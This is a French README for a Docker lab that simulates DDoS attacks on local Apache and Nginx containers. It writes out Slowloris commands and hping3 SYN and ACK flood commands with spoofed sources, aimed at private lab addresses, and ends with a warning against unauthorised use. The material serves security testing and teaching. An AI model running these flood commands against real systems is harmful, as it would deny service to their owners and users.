# DDoS Attack Simulation Tool

Ce projet fournit un ensemble d'outils pour simuler des attaques DDoS contre des serveurs Apache et Nginx à des fins de test et d'évaluation de la sécurité.

## Prérequis

- Docker et Docker Compose doivent être installés sur votre machine.

## Utilisation

1. Construction et exécution des conteneurs

```bash
docker-compose -f stack.yml up -d --build

# build images and run containers

```bash
docker-compose -f stack.yml up -d --build
```

2. Attaques HTTP Flood

- Attaque Slowloris contre le serveur Apache

```bash
docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.2 -s 1000"
```

- Attaque Slowloris contre le serveur Nginx

```bash
docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.3 -s 1000"
```

3. Attaques SYN Flood

- Attaque SYN Flood contre le serveur Apache

```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
```

- Attaque SYN Flood contre le serveur Nginx
```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
```

4. Attaques ACK Flood

- Attaque ACK Flood contre le serveur Apache
```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
```

- Attaque ACK Flood contre le serveur Nginx
```bash
docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
```

5. Arrêt et suppression des conteneurs
```bash
docker-compose -f stack.yml down
```

## Avertissement
Ce projet est uniquement destiné à des fins éducatives et de test. L'utilisation de ces outils contre des systèmes sans autorisation est illégale.

## Auteur
Ahmat Mahamat Ahmat

Email : ahmatmhtlouky@gmail.com

## Licence

Ce projet est sous licence MIT. Voir le fichier LICENSE pour plus de détails.
 
